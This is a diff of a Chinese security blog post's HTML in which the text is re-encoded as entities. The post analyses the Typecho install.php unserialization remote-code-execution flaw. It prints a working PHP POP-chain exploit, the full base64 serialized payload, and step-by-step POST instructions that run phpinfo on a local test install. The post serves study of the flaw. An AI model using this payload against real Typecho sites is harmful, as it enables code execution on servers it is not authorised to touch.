+<p>&#x5728;&#x8FD9;&#x91CC;&#x5B58;&#x5728;&#x4E24;&#x4E2A;&#x53CD;&#x8C03;&#x51FD;&#x6570;&#xFF1A;&#x5206;&#x522B;&#x4E3A;&#xFF1A;array_map(),call_user_func().</p>
 <ol>
-<li>call_user_func()（把第一个参数作为回调函数调用）</li>
-<li>array_map()（函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。）</li>
+<li>call_user_func()&#xFF08;&#x628A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4F5C;&#x4E3A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x8C03;&#x7528;&#xFF09;</li>
+<li>array_map()&#xFF08;&#x51FD;&#x6570;&#x5C06;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x5230;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x503C;&#x4E0A;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x540E;&#x7684;&#x5E26;&#x6709;&#x65B0;&#x503C;&#x7684;&#x6570;&#x7EC4;&#x3002;&#xFF09;</li>
 </ol>
-<p>这两个函数都是作为可以执行代码的函数，并且$filter与$value的值可以通过反序列化间接控制。</p>
-<h3 id="附上网络上的EXP："><a href="#附上网络上的EXP：" class="headerlink" title="附上网络上的EXP："></a>附上网络上的EXP：</h3><pre><code>&lt;?php
+<p>&#x8FD9;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x90FD;&#x662F;&#x4F5C;&#x4E3A;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x5E76;&#x4E14;$filter&#x4E0E;$value&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x95F4;&#x63A5;&#x63A7;&#x5236;&#x3002;</p>
+<h3 id="&#x9644;&#x4E0A;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;EXP&#xFF1A;"><a href="#&#x9644;&#x4E0A;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;EXP&#xFF1A;" class="headerlink" title="&#x9644;&#x4E0A;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;EXP&#xFF1A;"></a>&#x9644;&#x4E0A;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;EXP&#xFF1A;</h3><pre><code>&lt;?php
 class Typecho_Request
 {
     private $_params = array();
@@ -355,13 +228,13 @@ class Typecho_Request
 class Typecho_Feed
 {
     const RSS2 = &apos;RSS 2.0&apos;;
-    /** 定义ATOM 1.0类型 */
+    /** &#x5B9A;&#x4E49;ATOM 1.0&#x7C7B;&#x578B; */
     const ATOM1 = &apos;ATOM 1.0&apos;;
-    /** 定义RSS时间格式 */
+    /** &#x5B9A;&#x4E49;RSS&#x65F6;&#x95F4;&#x683C;&#x5F0F; */
     const DATE_RFC822 = &apos;r&apos;;
-    /** 定义ATOM时间格式 */
+    /** &#x5B9A;&#x4E49;ATOM&#x65F6;&#x95F4;&#x683C;&#x5F0F; */
     const DATE_W3CDTF = &apos;c&apos;;
-    /** 定义行结束符 */
+    /** &#x5B9A;&#x4E49;&#x884C;&#x7ED3;&#x675F;&#x7B26; */
     const EOL = &quot;\n&quot;;
     private $_type;
     private $_items = array();
@@ -393,50 +266,51 @@ $a = array(
 echo urlencode(base64_encode(serialize($a)));
 ?&gt;
 
-生成的payload为：YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
-</code></pre><h3 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h3><p>上面的exp是一个大神写的，下面的分析是基于它的exp然后删减了一些没有必要的。 只作简单的分析。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();				<span class="comment">//要间接控制_filter[0]的值，需要定义这两个数组！</span></span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = <span class="number">1</span>;	<span class="comment">//会判断他是否被定义，如果赋予0，则会出错。所以这里的值只要不为0都行！</span></span><br><span class="line">        <span class="comment">//这里的数组索引必须是screenName，因为触发__get()方法是由于调用了screenName属性，这里的screenName正是调用属性时候赋予给get()的值即$key的值</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'echo "fuckkkkkk!!!"'</span>;	<span class="comment">//有一个foreach命令，会将$this-&gt;_filter[0]进行call_user_func(),并将值作为函数运行。即利用代码！</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** 定义RSS 2.0类型 */</span></span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;   <span class="comment">//页面里面有个if命令，后面的$this-&gt;_type需要和这个相等，才能执行到调用screenName的地方！</span></span><br><span class="line">	<span class="keyword">private</span> $_type;</span><br><span class="line">	<span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_type = <span class="keyword">self</span>::RSS2;  <span class="comment">//self是引用静态类的类名，而$this是引用非静态类的实例名。    在这里将RSS2的值赋值给$this-&gt;_type。</span></span><br><span class="line"></span><br><span class="line">	    $item[<span class="string">'link'</span>] = <span class="string">'1'</span>;</span><br><span class="line">	    $item[<span class="string">'title'</span>] = <span class="string">'2'</span>;</span><br><span class="line">	    $item[<span class="string">'date'</span>] = <span class="number">1507720298</span>;</span><br><span class="line">	    $item[<span class="string">'author'</span>] = <span class="keyword">new</span> Typecho_Request();			<span class="comment">//'author'里面包含的对象，没有sreenName属性才能出发_get()魔术方法。</span></span><br><span class="line">	    $item[<span class="string">'category'</span>] = <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request());	<span class="comment">//看到一篇文章说这条也是可以省略的，原话是：“'category' 用于分支处理，如果不用于回显数据，此字段可以省略”但是省略了之后和上面link等医院的会报错。！</span></span><br><span class="line">	    <span class="comment">//分析不到这个地方，并不清楚这个地方link，title，date是找到需要被赋予的值的，缺少一个都不行，页面都显示错误。</span></span><br><span class="line">	    <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = $item;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();		<span class="comment">//这里实例了Typecho_Feed()对象。</span></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'adapter'</span> =&gt; $a,			<span class="comment">//这里将adapter设置为一个对象，才能出发__toString()魔术方法。</span></span><br><span class="line">    <span class="string">'prefix'</span> =&gt; <span class="string">'typecho_'</span>		<span class="comment">//这里省略也可以运行phpinfo，但是PHP会报错。</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h3><pre><code>在火狐浏览器打开：http://localhost/install.php
-打开HackBar：
-网址为：http://localhost/install.php?finish=a
-POST内容为：__typecho_config=YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
+&#x751F;&#x6210;&#x7684;payload&#x4E3A;&#xFF1A;YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
+</code></pre><h3 id="EXP&#x5206;&#x6790;"><a href="#EXP&#x5206;&#x6790;" class="headerlink" title="EXP&#x5206;&#x6790;"></a>EXP&#x5206;&#x6790;</h3><p>&#x4E0A;&#x9762;&#x7684;exp&#x662F;&#x4E00;&#x4E2A;&#x5927;&#x795E;&#x5199;&#x7684;&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x5206;&#x6790;&#x662F;&#x57FA;&#x4E8E;&#x5B83;&#x7684;exp&#x7136;&#x540E;&#x5220;&#x51CF;&#x4E86;&#x4E00;&#x4E9B;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x7684;&#x3002; &#x53EA;&#x4F5C;&#x7B80;&#x5355;&#x7684;&#x5206;&#x6790;&#x3002;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $_params = <span class="hljs-keyword">array</span>();				<span class="hljs-comment">//&#x8981;&#x95F4;&#x63A5;&#x63A7;&#x5236;_filter[0]&#x7684;&#x503C;&#xFF0C;&#x9700;&#x8981;&#x5B9A;&#x4E49;&#x8FD9;&#x4E24;&#x4E2A;&#x6570;&#x7EC4;&#xFF01;</span></span><br><span class="line">    <span class="hljs-keyword">private</span> $_filter = <span class="hljs-keyword">array</span>();</span><br><span class="line">	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&apos;screenName&apos;</span>] = <span class="hljs-number">1</span>;	<span class="hljs-comment">//&#x4F1A;&#x5224;&#x65AD;&#x4ED6;&#x662F;&#x5426;&#x88AB;&#x5B9A;&#x4E49;&#xFF0C;&#x5982;&#x679C;&#x8D4B;&#x4E88;0&#xFF0C;&#x5219;&#x4F1A;&#x51FA;&#x9519;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;&#x503C;&#x53EA;&#x8981;&#x4E0D;&#x4E3A;0&#x90FD;&#x884C;&#xFF01;</span></span><br><span class="line">        <span class="hljs-comment">//&#x8FD9;&#x91CC;&#x7684;&#x6570;&#x7EC4;&#x7D22;&#x5F15;&#x5FC5;&#x987B;&#x662F;screenName&#xFF0C;&#x56E0;&#x4E3A;&#x89E6;&#x53D1;__get()&#x65B9;&#x6CD5;&#x662F;&#x7531;&#x4E8E;&#x8C03;&#x7528;&#x4E86;screenName&#x5C5E;&#x6027;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;screenName&#x6B63;&#x662F;&#x8C03;&#x7528;&#x5C5E;&#x6027;&#x65F6;&#x5019;&#x8D4B;&#x4E88;&#x7ED9;get()&#x7684;&#x503C;&#x5373;$key&#x7684;&#x503C;</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>] = <span class="hljs-string">&apos;echo &quot;fuckkkkkk!!!&quot;&apos;</span>;	<span class="hljs-comment">//&#x6709;&#x4E00;&#x4E2A;foreach&#x547D;&#x4EE4;&#xFF0C;&#x4F1A;&#x5C06;$this-&gt;_filter[0]&#x8FDB;&#x884C;call_user_func(),&#x5E76;&#x5C06;&#x503C;&#x4F5C;&#x4E3A;&#x51FD;&#x6570;&#x8FD0;&#x884C;&#x3002;&#x5373;&#x5229;&#x7528;&#x4EE3;&#x7801;&#xFF01;</span></span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span>{</span><br><span class="line"></span><br><span class="line">	<span class="hljs-comment">/** &#x5B9A;&#x4E49;RSS 2.0&#x7C7B;&#x578B; */</span></span><br><span class="line">    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&apos;RSS 2.0&apos;</span>;   <span class="hljs-comment">//&#x9875;&#x9762;&#x91CC;&#x9762;&#x6709;&#x4E2A;if&#x547D;&#x4EE4;&#xFF0C;&#x540E;&#x9762;&#x7684;$this-&gt;_type&#x9700;&#x8981;&#x548C;&#x8FD9;&#x4E2A;&#x76F8;&#x7B49;&#xFF0C;&#x624D;&#x80FD;&#x6267;&#x884C;&#x5230;&#x8C03;&#x7528;screenName&#x7684;&#x5730;&#x65B9;&#xFF01;</span></span><br><span class="line">	<span class="hljs-keyword">private</span> $_type;</span><br><span class="line">	<span class="hljs-keyword">private</span> $_items = <span class="hljs-keyword">array</span>();</span><br><span class="line">	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">		<span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-keyword">self</span>::RSS2;  <span class="hljs-comment">//self&#x662F;&#x5F15;&#x7528;&#x9759;&#x6001;&#x7C7B;&#x7684;&#x7C7B;&#x540D;&#xFF0C;&#x800C;$this&#x662F;&#x5F15;&#x7528;&#x975E;&#x9759;&#x6001;&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x540D;&#x3002;    &#x5728;&#x8FD9;&#x91CC;&#x5C06;RSS2&#x7684;&#x503C;&#x8D4B;&#x503C;&#x7ED9;$this-&gt;_type&#x3002;</span></span><br><span class="line"></span><br><span class="line">	    $item[<span class="hljs-string">&apos;link&apos;</span>] = <span class="hljs-string">&apos;1&apos;</span>;</span><br><span class="line">	    $item[<span class="hljs-string">&apos;title&apos;</span>] = <span class="hljs-string">&apos;2&apos;</span>;</span><br><span class="line">	    $item[<span class="hljs-string">&apos;date&apos;</span>] = <span class="hljs-number">1507720298</span>;</span><br><span class="line">	    $item[<span class="hljs-string">&apos;author&apos;</span>] = <span class="hljs-keyword">new</span> Typecho_Request();			<span class="hljs-comment">//&apos;author&apos;&#x91CC;&#x9762;&#x5305;&#x542B;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x6CA1;&#x6709;sreenName&#x5C5E;&#x6027;&#x624D;&#x80FD;&#x51FA;&#x53D1;_get()&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002;</span></span><br><span class="line">	    $item[<span class="hljs-string">&apos;category&apos;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> Typecho_Request());	<span class="hljs-comment">//&#x770B;&#x5230;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x8BF4;&#x8FD9;&#x6761;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#x7684;&#xFF0C;&#x539F;&#x8BDD;&#x662F;&#xFF1A;&#x201C;&apos;category&apos; &#x7528;&#x4E8E;&#x5206;&#x652F;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x7528;&#x4E8E;&#x56DE;&#x663E;&#x6570;&#x636E;&#xFF0C;&#x6B64;&#x5B57;&#x6BB5;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#x201D;&#x4F46;&#x662F;&#x7701;&#x7565;&#x4E86;&#x4E4B;&#x540E;&#x548C;&#x4E0A;&#x9762;link&#x7B49;&#x533B;&#x9662;&#x7684;&#x4F1A;&#x62A5;&#x9519;&#x3002;&#xFF01;</span></span><br><span class="line">	    <span class="hljs-comment">//&#x5206;&#x6790;&#x4E0D;&#x5230;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#xFF0C;&#x5E76;&#x4E0D;&#x6E05;&#x695A;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;link&#xFF0C;title&#xFF0C;date&#x662F;&#x627E;&#x5230;&#x9700;&#x8981;&#x88AB;&#x8D4B;&#x4E88;&#x7684;&#x503C;&#x7684;&#xFF0C;&#x7F3A;&#x5C11;&#x4E00;&#x4E2A;&#x90FD;&#x4E0D;&#x884C;&#xFF0C;&#x9875;&#x9762;&#x90FD;&#x663E;&#x793A;&#x9519;&#x8BEF;&#x3002;</span></span><br><span class="line">	    <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>] = $item;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">$a = <span class="hljs-keyword">new</span> Typecho_Feed();		<span class="hljs-comment">//&#x8FD9;&#x91CC;&#x5B9E;&#x4F8B;&#x4E86;Typecho_Feed()&#x5BF9;&#x8C61;&#x3002;</span></span><br><span class="line">$exp = <span class="hljs-keyword">array</span>(</span><br><span class="line">    <span class="hljs-string">&apos;adapter&apos;</span> =&gt; $a,			<span class="hljs-comment">//&#x8FD9;&#x91CC;&#x5C06;adapter&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x624D;&#x80FD;&#x51FA;&#x53D1;__toString()&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002;</span></span><br><span class="line">    <span class="hljs-string">&apos;prefix&apos;</span> =&gt; <span class="hljs-string">&apos;typecho_&apos;</span>		<span class="hljs-comment">//&#x8FD9;&#x91CC;&#x7701;&#x7565;&#x4E5F;&#x53EF;&#x4EE5;&#x8FD0;&#x884C;phpinfo&#xFF0C;&#x4F46;&#x662F;PHP&#x4F1A;&#x62A5;&#x9519;&#x3002;</span></span><br><span class="line">);</span><br><span class="line"><span class="hljs-keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#xFF1A;"><a href="#&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#xFF1A;" class="headerlink" title="&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#xFF1A;"></a>&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#xFF1A;</h3><pre><code>&#x5728;&#x706B;&#x72D0;&#x6D4F;&#x89C8;&#x5668;&#x6253;&#x5F00;&#xFF1A;http://localhost/install.php
+&#x6253;&#x5F00;HackBar&#xFF1A;
+&#x7F51;&#x5740;&#x4E3A;&#xFF1A;http://localhost/install.php?finish=a
+POST&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;__typecho_config=YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
 Referrer=http://localhost/install.php
-发送POST即可看到网页执行了&lt;?php phpinfo(); ?&gt; 即漏洞利用成功！
-</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+&#x53D1;&#x9001;POST&#x5373;&#x53EF;&#x770B;&#x5230;&#x7F51;&#x9875;&#x6267;&#x884C;&#x4E86;&lt;?php phpinfo(); ?&gt; &#x5373;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6210;&#x529F;&#xFF01;
+</code></pre><h3 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h3><ol>
 <li><a href="https://www.freebuf.com/vuls/152058.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/152058.html</a></li>
 <li><a href="https://www.freebuf.com/vuls/155753.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/155753.html</a></li>
 <li><a href="https://paper.seebug.org/424/" target="_blank" rel="noopener">https://paper.seebug.org/424/</a></li>
-<li><a href="http://www.blogsir.com.cn/safe/454.html" target="_blank" rel="noopener">http://www.blogsir.com.cn/safe/454.html</a> //今天突然打不开了。</li>
-<li><a href="http://www.blogsir.com.cn/safe/452.html" target="_blank" rel="noopener">POP链和序列化，反序列化操作 - rivir-江sir</a> //也是打不开！</li>
+<li><a href="http://www.blogsir.com.cn/safe/454.html" target="_blank" rel="noopener">http://www.blogsir.com.cn/safe/454.html</a> //&#x4ECA;&#x5929;&#x7A81;&#x7136;&#x6253;&#x4E0D;&#x5F00;&#x4E86;&#x3002;</li>
+<li><a href="http://www.blogsir.com.cn/safe/452.html" target="_blank" rel="noopener">POP&#x94FE;&#x548C;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C; - rivir-&#x6C5F;sir</a> //&#x4E5F;&#x662F;&#x6253;&#x4E0D;&#x5F00;&#xFF01;</li>
 </ol>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="call-user-func-（把第一个参数作为回调函数调用）"><a href="#call-user-func-（把第一个参数作为回调函数调用）" class="headerlink" title="call_user_func （把第一个参数作为回调函数调用）"></a>call_user_func （把第一个参数作为回调函数调用）</h4><pre><code>&lt;?php 
-    function barber($type){                                    //定义一个函数barber
